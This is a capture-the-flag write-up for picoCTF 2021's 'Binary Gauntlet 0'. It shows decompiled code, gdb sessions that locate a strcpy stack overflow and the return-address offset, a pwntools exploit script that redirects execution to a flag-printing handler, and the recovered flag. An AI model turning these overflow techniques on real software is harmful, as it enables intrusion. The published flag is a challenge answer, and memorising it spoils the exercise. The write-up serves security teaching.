# Binary Gauntlet 0 - picoCTF 2021 - CMU Cybersecurity Competition
Binary Exploitation, 10 Points

## Description

*nc mercury.picoctf.net 64629*

Attached file [gauntlet](gauntlet)

## Binary Gauntlet 0 Solution

First, Let's run the file:
```console
┌─[evyatar@parrot]─[/pico2021/BinaryGauntlet0] 
└──╼ $ ./gauntlet 
AAAA
AAAA
BBBB
```

Nothing juicy, Let's try to observe the main function using Ghidra:
```c

undefined8 main(void)

{
  char local_88 [108];
  __gid_t local_1c;
  FILE *local_18;
  char *local_10;
  
  local_10 = (char *)malloc(1000);
  local_18 = fopen("flag.txt","r");
  if (local_18 == (FILE *)0x0) {
    puts(
        "Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are runningthis on the shell server."
        );
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  fgets(flag,0x40,local_18);
  signal(0xb,sigsegv_handler);
  local_1c = getegid();
  setresgid(local_1c,local_1c,local_1c);
  fgets(local_10,1000,stdin);
  local_10[999] = '\0';
  printf(local_10);
  fflush(stdout);
  fgets(local_10,1000,stdin);
  local_10[999] = '\0';
  strcpy(local_88,local_10);
  return 0;
}
```

So we can see the following copy ```fgets(flag,0x40,local_18);``` - Copy the data from ```flag.txt``` into ```flag``` variable, Then the binary ask twice for input ```fgets(local_10,1000,stdin);```, ```strcpy(local_88,local_10);```.

The first ```fgets``` copy from ```stdin``` into ```local_10``` which is:
```c
char *local_10;
...  
local_10 = (char *)malloc(1000);
```

The next ```fgets``` also copy from ```stdin``` into ```local_10``` but then it will copy the data to ```local_88``` which is ```char local_88 [108]```, So It's mean if our input big then 108 we can get overflow.

Our target is to print ```flag``` variable, By looking for reference to ```flag``` variable we can see the following function:
```c
void sigsegv_handler(void)

{
  fprintf(stderr,"%s\n",flag);
  fflush(stderr);
  exit(1);
}
```

The function above not called, But we can use buffer overflow to override ```RIP``` to change the return address to ```sigsegv_handler``` function.

Let's try to use ```gdb``` to find the offset between ```char local_88 [108]``` to ```RIP``` and to find the address of ```sigsegv_handler``` function:
```console
┌─[evyatar@parrot]─[/pico2021/BinaryGauntlet0] 
└──╼ $ gdb ./gauntlet 
GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
89 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6
[*] 3 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./gauntlet...(no debugging symbols found)...done.
gef➤  p sigsegv_handler 
$1 = {<text variable, no debug info>} 0x4008c7 <sigsegv_handler> 
```

By using ```p sigsegv_handler``` we get the address of ```sigsegv_handler``` function: ```0x4008c7```.

Now, Let's put breakepoint after ```strcpy(local_88,local_10);``` to find the address of our buffer ```char local_88 [108]```.

First, Let's disassamble the main function:
```asm
gef➤  disassemble main
Dump of assembler code for function main:
   0x000000000040090d <+0>:	push   rbp
   0x000000000040090e <+1>:	mov    rbp,rsp
   0x0000000000400911 <+4>:	sub    rsp,0x90
   0x0000000000400918 <+11>:	mov    DWORD PTR [rbp-0x84],edi
   0x000000000040091e <+17>:	mov    QWORD PTR [rbp-0x90],rsi
   0x0000000000400925 <+24>:	mov    edi,0x3e8
   0x000000000040092a <+29>:	call   0x400790 <malloc@plt>
   0x000000000040092f <+34>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000000000400933 <+38>:	lea    rsi,[rip+0x192]        # 0x400acc
   0x000000000040093a <+45>:	lea    rdi,[rip+0x18d]        # 0x400ace
   0x0000000000400941 <+52>:	call   0x4007c0 <fopen@plt>
   0x0000000000400946 <+57>:	mov    QWORD PTR [rbp-0x10],rax
   0x000000000040094a <+61>:	cmp    QWORD PTR [rbp-0x10],0x0
   0x000000000040094f <+66>:	jne    0x400967 <main+90>
   0x0000000000400951 <+68>:	lea    rdi,[rip+0x180]        # 0x400ad8
   0x0000000000400958 <+75>:	call   0x400730 <puts@plt>
   0x000000000040095d <+80>:	mov    edi,0x0
   0x0000000000400962 <+85>:	call   0x4007d0 <exit@plt>
   0x0000000000400967 <+90>:	mov    rax,QWORD PTR [rbp-0x10]
   0x000000000040096b <+94>:	mov    rdx,rax
   0x000000000040096e <+97>:	mov    esi,0x40
   0x0000000000400973 <+102>:	lea    rdi,[rip+0x200766]        # 0x6010e0 <flag>
   0x000000000040097a <+109>:	call   0x400760 <fgets@plt>
   0x000000000040097f <+114>:	lea    rsi,[rip+0xffffffffffffff41]        # 0x4008c7 <sigsegv_handler>
   0x0000000000400986 <+121>:	mov    edi,0xb
   0x000000000040098b <+126>:	call   0x400770 <signal@plt>
   0x0000000000400990 <+131>:	mov    eax,0x0
   0x0000000000400995 <+136>:	call   0x4007b0 <getegid@plt>
   0x000000000040099a <+141>:	mov    DWORD PTR [rbp-0x14],eax
   0x000000000040099d <+144>:	mov    edx,DWORD PTR [rbp-0x14]
   0x00000000004009a0 <+147>:	mov    ecx,DWORD PTR [rbp-0x14]
   0x00000000004009a3 <+150>:	mov    eax,DWORD PTR [rbp-0x14]
   0x00000000004009a6 <+153>:	mov    esi,ecx
   0x00000000004009a8 <+155>:	mov    edi,eax
   0x00000000004009aa <+157>:	mov    eax,0x0
   0x00000000004009af <+162>:	call   0x400740 <setresgid@plt>
   0x00000000004009b4 <+167>:	mov    rdx,QWORD PTR [rip+0x2006f5]        # 0x6010b0 <stdin@@GLIBC_2.2.5>
   0x00000000004009bb <+174>:	mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004009bf <+178>:	mov    esi,0x3e8
   0x00000000004009c4 <+183>:	mov    rdi,rax
   0x00000000004009c7 <+186>:	call   0x400760 <fgets@plt>
   0x00000000004009cc <+191>:	mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004009d0 <+195>:	add    rax,0x3e7
   0x00000000004009d6 <+201>:	mov    BYTE PTR [rax],0x0
   0x00000000004009d9 <+204>:	mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004009dd <+208>:	mov    rdi,rax
   0x00000000004009e0 <+211>:	mov    eax,0x0
   0x00000000004009e5 <+216>:	call   0x400750 <printf@plt>
   0x00000000004009ea <+221>:	mov    rax,QWORD PTR [rip+0x2006af]        # 0x6010a0 <stdout@@GLIBC_2.2.5>
   0x00000000004009f1 <+228>:	mov    rdi,rax
   0x00000000004009f4 <+231>:	call   0x4007a0 <fflush@plt>
   0x00000000004009f9 <+236>:	mov    rdx,QWORD PTR [rip+0x2006b0]        # 0x6010b0 <stdin@@GLIBC_2.2.5>
   0x0000000000400a00 <+243>:	mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400a04 <+247>:	mov    esi,0x3e8
   0x0000000000400a09 <+252>:	mov    rdi,rax
   0x0000000000400a0c <+255>:	call   0x400760 <fgets@plt>
   0x0000000000400a11 <+260>:	mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400a15 <+264>:	add    rax,0x3e7
   0x0000000000400a1b <+270>:	mov    BYTE PTR [rax],0x0
   0x0000000000400a1e <+273>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x0000000000400a22 <+277>:	lea    rax,[rbp-0x80]
   0x0000000000400a26 <+281>:	mov    rsi,rdx
   0x0000000000400a29 <+284>:	mov    rdi,rax
   0x0000000000400a2c <+287>:	call   0x400720 <strcpy@plt>
   0x0000000000400a31 <+292>:	mov    eax,0x0
   0x0000000000400a36 <+297>:	leave  
   0x0000000000400a37 <+298>:	ret    
End of assembler dump.
gef➤  
```

We can see the line after ```strcpy``` command: ```0x0000000000400a31 <+292>:	mov    eax,0x0``` Let's put breakepoint at this line:
```asm
gef➤  b *main+292
Breakpoint 1 at 0x400a31
```

Now, Let's try to run the binary with input ```BBBBBBBB``` (The second input) and then search this pattern to get the offset:
```asm
gef➤  r//pico2021/BinaryGauntlet0/gauntlet 
AAAAAAAA
AAAAAAAA
BBBBBBBB
Breakpoint 1, 0x0000000000400a31 in main ()
gef➤  search-pattern BBBBBBBB
[+] Searching 'BBBBBBBB' in memory
[+] In '[heap]'(0x602000-0x623000), permission=rwx
  0x602260 - 0x60226a  →   "BBBBBBBB\n" 
  0x603890 - 0x60389a  →   "BBBBBBBB\n" 
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rwx
  0x7fffffffdec0 - 0x7fffffffdeca  →   "BBBBBBBB\n" 
```

So we can see the buffer started from ```0x7fffffffdec0```, Let's find the address of ```RIP```:
```asm
gef➤  info frame
Stack level 0, frame at 0x7fffffffdf50:
 rip = 0x400a31 in main; saved rip = 0x7ffff7a03bf7
 Arglist at 0x7fffffffdf40, args: 
 Locals at 0x7fffffffdf40, Previous frame's sp is 0x7fffffffdf50
 Saved registers:
  rbp at 0x7fffffffdf40, rip at 0x7fffffffdf48
```

```RIP``` address is ```0x7fffffffdf48``` and the buffer started from ```0x7fffffffdec0```, the offset is ```0x7fffffffdf48-0x7fffffffdec0=0x88```.

So we need to fill the buffer started from ```0x7fffffffdec0```, Add padding bytes and override the ```RIP``` with ```0x4008c7``` which is the address of ```sigsegv_handler``` function.

So let's write simple python code to get the flag against the server:
```python
from pwn import *

payload='A'*(0x88 + 9) + p64(0x4008c7)

p = remote('mercury.picoctf.net', 64629)

print("Sending AAAA")
p.sendline("AAAA")
print(p.recv())
print("Sending payload...")
p.sendline(payload)
print("Flag:")
print(p.recv())
```

Run it:
```console
┌─[evyatar@parrot]─[/pico2021/BinaryGauntlet0] 
└──╼ $python binaryGauntlet0.py 
[+] Opening connection to mercury.picoctf.net on port 64629: Done
Sending AAAA
AAAA

eb39fb2d49b9579031ed4822a6ee7892


[*] Closed connection to mercury.picoctf.net port 64629
```

And the flag is ```eb39fb2d49b9579031ed4822a6ee7892```.